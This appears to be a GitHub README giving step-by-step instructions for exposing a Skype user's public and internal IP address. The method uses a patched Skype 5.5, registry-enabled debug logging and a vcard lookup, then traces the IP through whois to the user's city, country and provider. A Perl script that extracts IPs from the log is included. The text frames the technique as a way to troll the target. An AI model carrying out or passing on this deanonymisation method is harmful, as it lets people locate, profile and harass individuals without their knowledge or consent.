skype-fun
=========

Skype user IP-address disclosure

1. Downloading this patched version of Skype 5.5: 
http://skype-open-source.blogspot.com/2012/03/skype55-deobfuscated-released.html 

2. Turn on debug-log file creation via adding a few registry keys. 
https://github.com/skypeopensource/skypeopensource/wiki/skype-3.x-4.x-5.x-enable-logging 

3. Make "add a Skype contact" action, but not send add request, just click on user, to view his vcard(general info about user). This will be enough. 

4. Take look in the log of the desired skypename.
The record will be like this for real user ip: -r195.100.213.25:31101 
And like this for user internal network card ip: -l172.10.5.17 

21:16:45.818 T # 3668 PresenceManager: aїљ noticing skypetestuser1 0x3e54a539a91a19fc-s-s65.55.223.23 
:40013-r195 .100.213.25:31101-l172 .10.5.17:22960 23d23109 82f328ff 

5. Catch user via whois service.
http://nic.ru/whois/?query=195.100.213.25 

This is help you to get info about skype user: City, Country, Internet provider and internal user ip-address. 

Now you can troll him about CIA and Mossad, he-he.

--- 
Perl script to automate the search in the debug log. 
---
#!perl

$LOGFILE="debug-20120420-2257.log";
$SKYPENAME="skypetestuser1";

open(RD,$LOGFILE);
open(WR,">_ip_logger.txt");
while(<RD>){ chomp;
 $line=$_;

 if( ($line=~ /PresenceManager:/) and ($line=~ /noticing/) ){
  $line=~ /-r(\d+.\d+.\d+.\d+)/;
  $ip=$1;

  print WR $line."\n";
  print WR "IP: $ip\n";

  if ($line=~ /$SKYPENAME/){
   print $line."\n";
   print "${SKYPENAME} IP: $ip\n";
  };
 };

};
close(RD);
close(WR);
---